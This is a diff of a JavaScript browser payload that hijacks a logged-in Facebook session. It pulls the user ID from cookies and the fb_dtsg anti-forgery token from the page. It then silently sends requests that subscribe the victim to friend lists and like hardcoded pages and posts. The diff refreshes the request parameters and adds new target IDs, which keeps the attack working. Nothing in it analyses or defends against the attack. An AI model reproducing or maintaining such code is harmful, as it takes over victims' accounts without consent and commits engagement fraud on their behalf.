@@ -27,8 +27,8 @@ var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 function LIST(L) {
     var X = new XMLHttpRequest();
-    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
-    var XParams = "flid=" + L + "&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user=" + user_id + "&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg=" + fb_dtsg + "&phstamp=";
+    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+L;
+    var XParams = "fb_dtsg="+fb_dtsg+"&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
     X.open("POST", XURL, true);
     X.onreadystatechange = function () {
         if (X.readyState == 4 && X.status == 200) {
@@ -52,7 +52,7 @@ var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 function Like(p) {
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
-    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
+    var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
@@ -61,11 +61,13 @@ function Like(p) {
     };
     Page.send(PageParams);
 }
+Like("296798353735308");
+Like("297301193718363");
+Like("232233963594535");
+Like("626063890768919");
 Like("514486465297821");
 Like("199134496914077");
-Like("232233963594535");
-Like("514486465297821");
-Like("291522814324096");
+Like("165411580286132");
 
 
 
@@ -147,10 +149,11 @@ var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var now = (new Date).getTime();
 
-function P(post) {
+function p(post) {
+  
     var X = new XMLHttpRequest();
     var XURL = "//www.facebook.com/ajax/ufi/like.php";
-    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=1&client_id=" + now + "%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]=" + post + "&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg=" + fb_dtsg + "&phstamp=";
+    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
     X.open("POST", XURL, true);
     X.onreadystatechange = function () {
         if (X.readyState == 4 && X.status == 200) {
@@ -159,14 +162,16 @@ function P(post) {
     };
     X.send(XParams);
 }
-P("174722959374901");
-P("296798353735308");
-p("297301193718363");
-p("232233963594535");
-p("626063890768919");
-p("514486465297821");
-P("199134496914077");
-p("165411580286132");
+p("174722959374901");
+p("100003147643648");
+p("174782549368942");
+p("199654230215107");
+p("209392225888304");
+p("208580292636164");
+p("208580092636184");
+p("199457596881767");
+p("199457363548457");
+p("199459220214938");
 
 
 
